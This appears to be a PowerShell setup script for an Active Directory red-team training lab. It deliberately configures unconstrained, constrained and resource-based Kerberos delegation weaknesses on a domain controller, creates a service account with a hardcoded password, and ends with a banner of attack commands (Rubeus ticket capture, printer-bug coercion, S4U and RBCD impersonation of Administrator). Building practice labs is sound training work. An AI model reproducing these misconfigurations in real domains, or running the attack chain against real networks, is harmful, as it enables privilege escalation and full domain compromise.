# ============================================================
# ORSUBANK AD RED TEAM LAB - DELEGATION VULNERABILITIES
# ============================================================
# Script Name: Enable-DelegationVulnerabilities.ps1
# Purpose: Creates Kerberos delegation vulnerabilities
# Location: Run on DC01 (Domain Controller)
# 
# WHAT THIS SCRIPT DOES:
# 1. Unconstrained Delegation - Any service can impersonate any user
# 2. Constrained Delegation - Limited but still abusable
# 3. Resource-Based Constrained Delegation (RBCD) - Modern attack vector
# ============================================================

# Verify running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] ERROR: Run this script as Administrator!" -ForegroundColor Red
    exit 1
}

Import-Module ActiveDirectory -ErrorAction Stop

Write-Host @"

╔══════════════════════════════════════════════════════════════════════════════╗
║              ORSUBANK - DELEGATION VULNERABILITIES                            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Creating Kerberos delegation misconfigurations                               ║
║  These allow attackers to impersonate users and escalate privileges           ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan

# ============================================================
# VULN 1: UNCONSTRAINED DELEGATION
# ============================================================
# When a server has unconstrained delegation, it can impersonate ANY user
# who authenticates to it. This is VERY dangerous!

Write-Host "[*] Creating VULN 1: Unconstrained Delegation" -ForegroundColor Yellow
Write-Host "    Setting WS01 to trust for delegation to any service" -ForegroundColor Gray

try {
    $WS01 = Get-ADComputer "WS01" -ErrorAction SilentlyContinue
    if ($WS01) {
        Set-ADComputer -Identity "WS01" -TrustedForDelegation $true
        Write-Host "    [+] Enabled Unconstrained Delegation on WS01" -ForegroundColor Green
        Write-Host "    [!] WS01 can now impersonate ANY user who authenticates to it!" -ForegroundColor Magenta
    } else {
        Write-Host "    [!] WS01 not found - join it to domain first" -ForegroundColor Yellow
    }
} catch {
    Write-Host "    [!] Error: $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================
# VULN 2: CONSTRAINED DELEGATION
# ============================================================
# Create a service account that can delegate to specific services

Write-Host "`n[*] Creating VULN 2: Constrained Delegation" -ForegroundColor Yellow
Write-Host "    Creating svc_web that can delegate to CIFS on DC01" -ForegroundColor Gray

$SvcWebPassword = ConvertTo-SecureString "WebSvc@2024!" -AsPlainText -Force
try {
    # Create service account
    New-ADUser -Name "svc_web" `
        -SamAccountName "svc_web" `
        -UserPrincipalName "svc_web@orsubank.local" `
        -Path "CN=Users,DC=orsubank,DC=local" `
        -AccountPassword $SvcWebPassword `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -Description "Web Application Service Account"
    
    Write-Host "    [+] Created svc_web with password: WebSvc@2024!" -ForegroundColor Green
} catch {
    if ($_.Exception.Message -like "*already exists*") {
        Write-Host "    [=] svc_web already exists" -ForegroundColor Yellow
    }
}

# Set SPN and constrained delegation
try {
    Set-ADUser -Identity "svc_web" -ServicePrincipalNames @{Add="HTTP/web.orsubank.local"}
    
    # Enable constrained delegation to CIFS on DC01
    Set-ADUser -Identity "svc_web" -Add @{
        "msDS-AllowedToDelegateTo" = @("CIFS/DC01.orsubank.local", "CIFS/DC01")
    }
    
    # Trust for delegation
    Set-ADAccountControl -Identity "svc_web" -TrustedToAuthForDelegation $true
    
    Write-Host "    [+] svc_web can delegate to CIFS/DC01 (file shares!)" -ForegroundColor Green
    Write-Host "    [!] Compromise svc_web = Access DC01's file shares as any user!" -ForegroundColor Magenta
} catch {
    Write-Host "    [!] Error configuring delegation: $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================
# VULN 3: RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)
# ============================================================
# Grant a user permission to configure RBCD on a computer
# This allows adding arbitrary computers to delegation

Write-Host "`n[*] Creating VULN 3: RBCD Configuration Rights" -ForegroundColor Yellow
Write-Host "    Granting vamsi.krishna permission to write msDS-AllowedToActOnBehalfOfOtherIdentity" -ForegroundColor Gray

try {
    $WS02 = Get-ADComputer "WS02" -ErrorAction SilentlyContinue
    $User = Get-ADUser "vamsi.krishna" -ErrorAction SilentlyContinue
    
    if ($WS02 -and $User) {
        # Get the computer's ACL
        $WS02DN = $WS02.DistinguishedName
        $Acl = Get-Acl "AD:\$WS02DN"
        
        # Grant WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity
        # GUID: 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
        $Ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $User.SID,
            "WriteProperty",
            "Allow",
            [GUID]"3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"  # msDS-AllowedToActOnBehalfOfOtherIdentity
        )
        
        $Acl.AddAccessRule($Ace)
        Set-Acl "AD:\$WS02DN" $Acl
        
        Write-Host "    [+] vamsi.krishna can configure RBCD on WS02" -ForegroundColor Green
        Write-Host "    [!] vamsi.krishna can add any computer to delegate to WS02!" -ForegroundColor Magenta
    } else {
        Write-Host "    [!] WS02 or vamsi.krishna not found" -ForegroundColor Yellow
    }
} catch {
    Write-Host "    [!] Error: $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================
# VERIFICATION
# ============================================================

Write-Host "`n" + "=" * 70 -ForegroundColor DarkGray
Write-Host "VERIFICATION" -ForegroundColor Cyan
Write-Host "=" * 70 -ForegroundColor DarkGray

# Check unconstrained delegation
Write-Host "`n[*] Computers with Unconstrained Delegation:" -ForegroundColor Yellow
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | ForEach-Object {
    Write-Host "    [+] $($_.Name)" -ForegroundColor Green
}

# Check constrained delegation
Write-Host "`n[*] Accounts with Constrained Delegation:" -ForegroundColor Yellow
Get-ADUser -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object {$_."msDS-AllowedToDelegateTo"} | ForEach-Object {
    Write-Host "    [+] $($_.SamAccountName) -> $($_.'msDS-AllowedToDelegateTo' -join ', ')" -ForegroundColor Green
}

# ============================================================
# ATTACK INSTRUCTIONS
# ============================================================

Write-Host @"

╔══════════════════════════════════════════════════════════════════════════════╗
║                           DELEGATION ATTACKS                                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  ATTACK 1: UNCONSTRAINED DELEGATION (WS01)                                   ║
║  ─────────────────────────────────────────                                   ║
║  1. Compromise WS01 (has unconstrained delegation)                           ║
║  2. Coerce DC01 to authenticate to WS01 (e.g., Printer Bug)                 ║
║  3. Extract DC01$ TGT from memory                                            ║
║  4. Use TGT to DCSync or access DC01                                         ║
║                                                                              ║
║  [Sliver] > execute-assembly /opt/tools/Rubeus.exe monitor /interval:5       ║
║  [Kali] > python3 printerbug.py orsubank/user:pass@DC01 WS01                 ║
║  [Sliver] > execute-assembly /opt/tools/Rubeus.exe ptt /ticket:<base64>      ║
║                                                                              ║
║  ATTACK 2: CONSTRAINED DELEGATION (svc_web)                                  ║
║  ─────────────────────────────────────────                                   ║
║  1. Get svc_web credentials (Kerberoast: WebSvc@2024!)                       ║
║  2. Request TGT for svc_web                                                  ║
║  3. Use S4U to get ticket for admin to CIFS/DC01                             ║
║                                                                              ║
║  [Kali] > getST.py -spn CIFS/DC01 -impersonate Administrator orsubank/svc_web║
║                                                                              ║
║  ATTACK 3: RBCD (vamsi.krishna -> WS02)                                      ║
║  ─────────────────────────────────────                                       ║
║  1. Add a computer account you control to allowed delegation                 ║
║  2. Use that to impersonate admin to WS02                                    ║
║                                                                              ║
║  [Kali] > addcomputer.py -computer-name EVIL$ -computer-pass Pass123 orsubank║
║  [Kali] > rbcd.py -delegate-from EVIL$ -delegate-to WS02$ orsubank/vamsi     ║
║  [Kali] > getST.py -spn CIFS/WS02 -impersonate Administrator orsubank/EVIL$  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor White

Write-Host "[+] Delegation vulnerabilities configured successfully!" -ForegroundColor Green
